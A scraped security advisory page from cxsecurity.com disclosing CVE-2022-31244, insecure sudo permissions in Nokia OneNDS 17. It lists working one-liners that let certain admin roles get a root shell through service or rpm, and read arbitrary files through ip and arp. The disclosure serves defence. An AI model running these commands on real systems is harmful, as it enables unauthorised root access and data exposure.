---
title: Nokia OneNDS 17 Insecure Permissions / Privilege Escalation
url: https://cxsecurity.com/issue/WLB-2023040076
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2023-04-24
fetch_date: 2025-10-04T11:31:25.107441
---

# Nokia OneNDS 17 Insecure Permissions / Privilege Escalation

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **Nokia OneNDS 17 Insecure Permissions / Privilege Escalation** **2023.04.23**  Credit:  **[Valerio Casalino](https://cxsecurity.com/author/Valerio%2BCasalino/1/)**  Risk: **Medium**  Local: ****Yes****  Remote: **No**  CVE: **[CVE-2022-31244](https://cxsecurity.com/cveshow/CVE-2022-31244/ "Click to see CVE-2022-31244")**  CWE: **[CWE-264](https://cxsecurity.com/cwe/CWE-264 "Click to see CWE-264")** | |

===============================================================================
title: Incorrect Permission Assignment
product: Nokia OneNDS 17
vulnerability type: Security Misconfiguration
severity: High
CVSS Score: 7.8
CVSS Vector: CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H
found on: 31/03/2022
by: Giacomo Sighinolfi, Milena Mangiola,
Savino Sisco, Valerio Casalino
cve: CVE-2022-31244
===============================================================================
Some sudo permissions can be exploited by the users that have specific roles
to escalate to root privileges and execute arbitrary commands on the system.
The affected roles are:
ONENDS\_CC\_BASIC\_ADMIN:
- it can run /sbin/service
- can be exploited using `sudo /sbin/service ../../bin/sh`
ONENDS\_CC\_SERVICE\_ADMIN:
- it can run /bin/rpm
- can be exploited using `sudo /bin/rpm --eval '%{lua:os.execute("/bin/sh")}'`
ONENDS\_CC\_NETWORK\_MANAGEMENT:
- it can run /sbin/ip,/sbin/arp
- can be exploited using `sudo /sbin/ip -force -batch 'file\_to\_read'`
- can be exploited using `sudo /sbin/arp -v -f 'file\_to\_read'`
===============================================================================

[**See this note in RAW Version**](https://cxsecurity.com/ascii/WLB-2023040076)

[Tweet](https://twitter.com/share)

Vote for this issue:
 0
 0

50%

50%

#### **Thanks for you vote!**

#### **Thanks for you comment!** Your message is in quarantine 48 hours.

Comment it here.

Nick (\*)

Email (\*)

Video

Text (\*)

(\*) - required fields.
Cancel
Submit

|  |  |
| --- | --- |
|  | **{{ x.nick }}** ![]() | Date: {{ x.ux \* 1000 | date:'yyyy-MM-dd' }} *{{ x.ux \* 1000 | date:'HH:mm' }}* CET+1  ---   {{ x.comment }} |

Show all comments

---

Copyright **2025**, cxsecurity.com

|  |

Back to Top